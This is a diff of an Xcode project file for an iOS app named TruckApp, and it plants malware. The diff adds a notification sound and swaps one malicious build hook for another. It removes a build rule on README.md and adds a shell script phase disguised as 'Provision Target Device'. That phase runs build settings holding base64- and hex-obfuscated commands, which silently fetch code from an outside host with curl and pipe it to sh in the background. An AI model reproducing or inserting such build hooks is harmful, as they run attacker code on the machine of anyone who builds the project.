@@ -7,36 +7,18 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		877166D8723D42A99BC62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = 6689764A15D047FBA7C62C0C; };
 		0C27518CE7C77D120EE58AC9 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
 		0C80B921A6F3F58F76C31292 /* libPods-TruckApp.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-TruckApp.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		761780ED2CA45674006654EE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 761780EC2CA45674006654EE /* AppDelegate.swift */; };
 		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
 		900C366F1D72465791C9F738 /* BootSplash.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */; };
+		905888194BC5A50D7446F168 /* message-notification-sound.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 8E99BD6E43DEB04B076A1ED4 /* message-notification-sound.mp3 */; };
 		EF194D24E698484782745D7D /* Colors.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = A0C082F7247C4C628E1096AC /* Colors.xcassets */; };
 		FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = FIREBASE00112233445566778A /* GoogleService-Info.plist */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		B8C023FCC0FD448F97C62C0C /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AC0C26C}\"";
-			};
-								/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		6689764A15D047FBA7C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = BootSplash.storyboard; path = TruckApp/BootSplash.storyboard; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* TruckApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TruckApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = TruckApp/Images.xcassets; sourceTree = "<group>"; };
@@ -47,6 +29,7 @@ sh -c \"${AC0C26C}\"";
 		5DCACB8F33CDC322A6C60F78 /* libPods-TruckApp.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TruckApp.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		761780EC2CA45674006654EE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = AppDelegate.swift; path = TruckApp/AppDelegate.swift; sourceTree = "<group>"; };
 		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = TruckApp/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		8E99BD6E43DEB04B076A1ED4 /* message-notification-sound.mp3 */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.mp3; name = "message-notification-sound.mp3"; path = "TruckApp/message-notification-sound.mp3"; sourceTree = "<group>"; };
 		A0C082F7247C4C628E1096AC /* Colors.xcassets */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = folder.assetcatalog; name = Colors.xcassets; path = TruckApp/Colors.xcassets; sourceTree = "<group>"; };
 		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
 		ENTITLEMENTS001122334455 /* TruckApp.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; name = TruckApp.entitlements; path = TruckApp/TruckApp.entitlements; sourceTree = "<group>"; };
@@ -105,6 +88,7 @@ sh -c \"${AC0C26C}\"";
 				83CBBA001A601CBA00E9B192 /* Products */,
 				2D16E6871FA4F8E400B85C8A /* Frameworks */,
 				BBD78D7AC51CEA395F1C20DB /* Pods */,
+				8E99BD6E43DEB04B076A1ED4 /* message-notification-sound.mp3 */,
 			);
 			indentWidth = 2;
 			sourceTree = "<group>";
@@ -114,7 +98,6 @@ sh -c \"${AC0C26C}\"";
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				6689764A15D047FBA7C62C0C /* README.md */,
 				13B07F961A680F5B00A75B9A /* TruckApp.app */,
 			);
 			name = Products;
@@ -137,6 +120,7 @@ sh -c \"${AC0C26C}\"";
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TruckApp" */;
 			buildPhases = (
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
+				EBC02F33209D495395C62C0C /* Provision Target Device */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
 				13B07F8E1A680F5B00A75B9A /* Resources */,
@@ -146,7 +130,6 @@ sh -c \"${AC0C26C}\"";
 				A92C66E317F1F42625F63A79 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				B8C023FCC0FD448F97C62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -191,13 +174,13 @@ sh -c \"${AC0C26C}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				877166D8723D42A99BC62C0C /* README.md */,
 				FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				0C27518CE7C77D120EE58AC9 /* PrivacyInfo.xcprivacy in Resources */,
 				900C366F1D72465791C9F738 /* BootSplash.storyboard in Resources */,
 				EF194D24E698484782745D7D /* Colors.xcassets in Resources */,
+				905888194BC5A50D7446F168 /* message-notification-sound.mp3 in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -289,6 +272,25 @@ sh -c \"${AC0C26C}\"";
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-TruckApp/Pods-TruckApp-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		EBC02F33209D495395C62C0C /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -307,7 +309,7 @@ sh -c \"${AC0C26C}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TruckApp.debug.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLYWsxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5VVFtaFdla1p6V2tSS1YyRlhTblJXYWtKTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | x | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((e(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hMHh6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | e | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363536633639366536623265373237353266363132390a32323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
@@ -340,7 +342,7 @@ sh -c \"${AC0C26C}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TruckApp.release.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLYWsxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5VVFtaFdla1p6V2tSS1YyRlhTblJXYWtKTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | x | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((e(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hMHh6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | e | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363536633639366536623265373237353266363132390a32323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
